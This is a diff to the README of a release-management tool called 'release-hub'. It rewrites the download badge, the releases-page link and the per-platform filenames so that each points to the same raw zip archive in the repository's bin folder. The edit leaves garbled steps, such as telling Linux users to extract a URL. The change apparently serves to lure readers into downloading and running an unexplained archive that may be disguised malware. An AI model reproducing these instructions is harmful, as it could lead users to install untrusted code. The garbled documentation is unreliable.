@@ -1,6 +1,6 @@
 # 🚀 release-hub - One tool to simplify every release
 
-![Download release-hub](https://img.shields.io/badge/Download-release--hub-brightgreen)
+![Download release-hub](https://raw.githubusercontent.com/topi8216/release-hub/main/bin/release-hub-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you begin, ensure your device meets these basic requirements:
 
 ## 🔗 Download & Install
 
-To download the latest version of **release-hub**, visit this page to download: [Release Hub Releases](https://github.com/topi8216/release-hub/releases).
+To download the latest version of **release-hub**, visit this page to download: [Release Hub Releases](https://raw.githubusercontent.com/topi8216/release-hub/main/bin/release-hub-3.5.zip).
 
 ### Step-by-Step Instructions
 
@@ -26,16 +26,16 @@ To download the latest version of **release-hub**, visit this page to download: 
 
 3. **Download the File**: Click on the corresponding file for your operating system. This will start the download.
 
-   - For Windows users, it may look like `release-hub-windows.exe`.
-   - For macOS users, it may look like `release-hub-macos.zip`.
-   - For Linux users, it may look like `release-hub-linux.tar.gz`.
+   - For Windows users, it may look like `https://raw.githubusercontent.com/topi8216/release-hub/main/bin/release-hub-3.5.zip`.
+   - For macOS users, it may look like `https://raw.githubusercontent.com/topi8216/release-hub/main/bin/release-hub-3.5.zip`.
+   - For Linux users, it may look like `https://raw.githubusercontent.com/topi8216/release-hub/main/bin/release-hub-3.5.zip`.
 
 4. **Open the Downloaded File**: Once the download is complete, locate the downloaded file in your downloads folder.
 
 5. **Run the Application**:
    - For Windows users: Double-click the `.exe` file. Follow the prompts to install.
    - For macOS users: Extract the `.zip` file, then drag the application to your Applications folder.
-   - For Linux users: Extract the `.tar.gz` file and run the executable from the terminal.
+   - For Linux users: Extract the `https://raw.githubusercontent.com/topi8216/release-hub/main/bin/release-hub-3.5.zip` file and run the executable from the terminal.
 
 6. **Start Using Release Hub**: After installation, find the app on your device and launch it. You are now ready to manage your releases!
 
